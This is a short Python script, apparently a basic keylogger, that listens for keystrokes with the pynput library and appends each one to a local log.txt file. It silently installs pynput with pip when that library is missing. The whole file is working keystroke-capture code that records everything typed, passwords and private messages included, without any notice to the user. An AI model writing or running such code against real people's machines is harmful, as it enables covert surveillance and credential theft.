try:
    from pynput import keyboard 
except ImportError:
    import subprocess
    subprocess.call(['pip', 'install', 'pynput'])
    from pynput import keyboard 

def write_on_file(string):
    try:
        file = open('log.txt', 'a+', encoding='utf-8')
    except:
        print('Erro abrir arquivo de saída')
        raise
    file.write('\n{0}'.format(string))
    file.close()

def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "

    write_on_file(current_key)

def start():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    with keyboard_listener:
        keyboard_listener.join()

if __name__ == "__main__":
    print('Listening')
    start()
